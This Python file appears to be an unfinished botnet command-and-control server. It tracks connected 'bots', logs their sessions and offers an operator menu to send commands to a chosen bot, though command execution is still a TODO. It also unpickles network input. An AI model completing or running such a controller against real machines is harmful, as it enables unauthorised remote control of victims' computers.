import random
import socket, pickle, security
import string
import threading, traceback
import time
from datetime import datetime

addr = ('127.0.0.1', 5000)
decryptor = security.get_decryptor()
#todo - client->server communication encrypted, server->client not

users = []

def is_int(str):
    try:
        return int(str)
    except:
        return False

def get_choice(opts, title):
    opt = None
    while not opt or not is_int(opt) or not 1 <= int(opt) <= len(opts):
        menu = title + '\n'
        for opt in enumerate(opts):
            menu += f'{opt[0] + 1}. {opt[1]}\n'
        menu = menu[:-1]
        print(menu)
        opt = input('> ')
    return int(opt) - 1

def get_user(id):
    for user in users:
        if user.id == id:
            return user

class User():
    def __init__(self, conn):
        self.conn = conn
        self.ip, self.port = conn[1][0], conn[1][1]
        self.hist = []
        self.msg = None
        self.alive = True
        self.id = ''.join(random.choices(string.ascii_lowercase, k=8))
        threading.Thread(target=self.keep_alive, args=()).start()

    def keep_alive(self):
        while True:
            try:
                self.conn[0].send(pickle.dumps('keepalive'))
                time.sleep(3)
            except:
                self.hist.append({'from': 'server', 'msg': 'client disconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
                self.alive = False
                return

    def send(self, msg):
        self.conn[0].send(pickle.dumps(msg))
        self.hist.append({'from': 'server', 'msg': msg, 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})

    def read(self):
        try:
            self.msg = self.conn[0].recv(4096)
            self.msg = clean(self.msg)
        except: #todo this might not work when not on 127.0.0.1
            self.hist.append({'from': 'server', 'msg': 'client disconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
            self.alive = False
            return -2
        if self.msg != -1:
            self.hist.append({'from': 'client', 'msg': self.msg, 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
            return self.msg

def clean(msg):
    try:
        msg = decryptor.decrypt(msg)
        return pickle.loads(msg)
    except ValueError:
        return -1

def handle_user(user):
    while user.alive: #todo maybe dont stop monitoring on dc?
        msg = user.read()
        if msg:
            if msg == -2:
                #print(f'{user.ip}:{user.port} disconnected')
                return
            else:
                #print(f'msg recv from user at {user.ip}:{user.port}: {msg}')
                user.send('Msg from server')
        else:
            #todo make this better
            #print(f'invalid msg recv from {user.ip}:{user.port}, notifying client')
            user.send('Invalid input recieved')

def get_instructions(): #todo add file down/uploading from bot, add more options
    opt = get_choice(['Select a bot'], 'Main Menu')
    if opt == 0:
        curr_users = [u.id for u in users]  # in case list of users changes before selection made
        opt = get_choice([f'{user.ip}:{user.port} | {"ALIVE" if user.alive else "DEAD"}' for user in users] + ['Main Menu'], 'Select a bot:' if len(users) > 0 else 'Select a bot:\nNo bots found!!!')
        if opt == len(curr_users):
            get_instructions()
        else:
            selected_user = curr_users[opt] #in case users list indexes change, can still get intented user using get_user(selected_user.id)
            if get_user(selected_user).alive:
                bot_opts = ['Send a command', 'View bot session logs', 'Main Menu']
                opt = get_choice(bot_opts, 'Choose an action:')
                if opt == len(bot_opts) - 1:
                    get_instructions()
                elif opt == 0:
                    cmd = input('Enter a command: ')
                    confirm = input(f'Are you sure you would like to run "{cmd}" on {get_user(selected_user).ip}:{get_user(selected_user).port}? (y/n) ')
                    if confirm.lower().startswith('y'):
                        print(f'Running command...')
                        print('TODO make command actually run') #TODO make command actually run
                    get_instructions()
                elif opt == 1:
                    for msg in get_user(selected_user).hist: #todo just give last 100 lines? add option for full?
                        print(f'{msg["timestamp"]} | {msg["from"]}: {msg["msg"]}')
                    get_instructions()
            else:
                print('Dead bot, chose a live one')
                get_instructions()

def run():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(addr)
    server.listen()
    print(f'Server running on {addr[0]}:{addr[1]}')

    threading.Thread(target=get_instructions, args=()).start()

    while True:
        conn = server.accept()
        user = User(conn)
        users.append(user)
        threading.Thread(target=handle_user, args=(user, )).start()


if __name__ == '__main__':
    run()